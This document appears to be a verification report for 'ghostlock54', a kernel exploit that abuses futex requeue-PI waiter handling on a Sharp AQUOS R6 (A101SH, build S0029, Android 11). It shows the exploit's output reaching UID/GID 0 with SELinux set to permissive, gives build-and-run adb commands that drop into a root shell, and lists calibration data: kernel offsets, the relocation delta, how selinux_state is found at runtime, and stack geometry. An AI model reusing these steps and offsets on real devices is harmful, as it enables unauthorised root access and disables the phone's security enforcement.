# AQUOS R6 GhostLock verification

Verified on 2026-09-15 against an A101SH (`Judau`) running build S0029 /
01.00.06, Android 11, and `5.4.61-qgki`.

## Result

The `ghostlock54` target completed the dangling waiter setup, settled the
waiter into a writable zero-BSS fake mutex, changed SELinux from enforcing to
permissive, and changed the process credentials to UID/GID 0.

Observed exploit output:

```text
[+] dangling waiter armed
[+] waiter settled
[*] write_trigger=1 enforce=1->0
[+] SELinux permissive verified
[*] uid=0 euid=0 gid=0 egid=0 enforce=0
[+] ROOT + permissive verified; entering direct shell
```

Independent readback through the root shell:

```text
uid=0(root) gid=0(root) ... context=u:r:shell:s0
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000000000c0
Permissive
NO_TCP_12345_LISTENER
```

This is verified real UID/GID 0 plus SELinux permissive. It is not full
capability root; the inherited Android shell capability bounding set remains
restricted. A reboot returns the device to its normal kernel state.

## Build and run

```sh
make build/ghostlock54
adb push build/ghostlock54 /data/local/tmp/ghostlock54
adb shell chmod 755 /data/local/tmp/ghostlock54
adb shell /data/local/tmp/ghostlock54 --leak-only
adb shell /data/local/tmp/ghostlock54 --leak-y-only
adb shell -t /data/local/tmp/ghostlock54
```

The final command enters the root shell directly over the existing ADB shell
transport; no TCP forwarding or `nc` is required. The exploit's parent closes
its standard streams and parks indefinitely after success because its kernel PI
references point into the live Y thread's stack. Do not terminate that process
as a normal cleanup operation. After leaving the root shell with `exit`, the
local `adb` command can remain waiting for that parked parent; interrupt only the
host-side `adb` client to detach. Reboot the device when cleanup is required.

## S0029 calibration

Sharp does not publish an S0029 source tag. The S0028 source rebuilt with the
device config and Android clang r383902 matches the device's `task_state`,
`futex_wait_requeue_pi`, and signal-return instruction locations. S0031 does
not match the later ThinLTO text layout.

The device relocates kernel data independently of the text-derived prediction.
For this build the observed difference is `+0x3f0000`. The exploit does not
assume that constant: it samples `sel_read_enforce` and takes x8 at
`+0x58..+0x60` as the runtime `selinux_state`, then derives the data delta.

Measured stack geometry:

- `rt_mutex_waiter`: syscall-entry SP `- 0x198`
- FPSIMD restore copy: syscall-entry SP `- 0x2e0`
- waiter stamp in `fpsimd_context.vregs`: `+0x148`, length `0x50`

Supporting safe-probe captures are under `build/perf-futex-s0029.txt`,
`build/perf-sigreturn-s0029.txt`, and `build/perf-enforce-s0029.txt`.
